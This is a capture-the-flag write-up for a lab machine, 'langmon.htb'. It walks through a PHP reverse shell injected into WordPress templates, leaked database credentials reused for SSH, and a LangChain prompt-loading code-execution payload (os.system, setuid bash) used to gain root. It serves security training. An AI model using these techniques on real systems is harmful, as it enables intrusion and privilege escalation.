1. Enumeration
- when scanning the server we can see that there is port 22 and 80 open
- trying to access the ip via the browser we get redirected to the "langmon.htb" page (you need to add it to the '/etc/hosts' file to be able to acces the site)
- When enumerating the site further it shows that the Page itself is a wordpress site
- I threw wpscan against it, but it didnt really show anything so I went on to do more enumeration manually  

2. Foothold and User
- in the Wordpress itself at *```/wp-login```* we can login, but we dont have any credentials...
- to log in we simply need to register a new user, doesnt really matter what credentials we put here
- we can go to the main Wordpress-editing page by clicking on the icon in the left upper corner after we successfully logged in
- to now get command-execution we need to inject some php into the site
- we can do that at *```Template -> New Template -> add an html&php-Field```* and inject a php reverse shell (I used one from pentest-monkey)
- so we start the listener and as soon as we hit *Update* we get a connection
- we connect as *```www-data```*, checking /etc/passwd there is a *```developer```* user 
- checking netstat we see a mysql-database running
- looking through the php-files there is a connection defined (for me running linpeas, which I uploaded via python http.server and wget, found the credentials)
```
define( 'DB_NAME', 'pwndb' );
define( 'DB_USER', 'wordpress_user' );
define( 'DB_PASSWORD', 'SNJQvwWHCK' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );
```
- Checking the database it leads nowhere, but the db_password is the same for the *```developer user```*, so we can now log into the machine via ssh

3. Root
- for root we check *```sudo -l```* showing we can run /opt/prompt_loader.py as root
- the script itself just trys to load a file we give via the cmd-line and then exits
- a bit of research shows that the loadprompt() function that is called with our file is vulnerable to arbitrary code execution (https://github.com/hwchase17/langchain/issues/4849)
- we can use the "reproduction" of the github entry and change the command to what we want
```
from langchain.output_parsers.list import CommaSeparatedListOutputParser
from langchain.prompts.prompt import PromptTemplate
_DECIDER_TEMPLATE = """Given the below input question and list of potential tables, output a comma separated list of the table names that may be neccessary to answer this question.

Question: {query}

Table Names: {table_names}

Relevant Table Names:"""

import os
os.system('id')
PROMPT = PromptTemplate(
    input_variables=["query", "table_names"],
    template=_DECIDER_TEMPLATE,
    output_parser=CommaSeparatedListOutputParser(),
)
```
- I mostly use ```chmod +s bash``` for that purpose
- When running it with sudo and then run ```bash -p``` we become root and can read the root flag

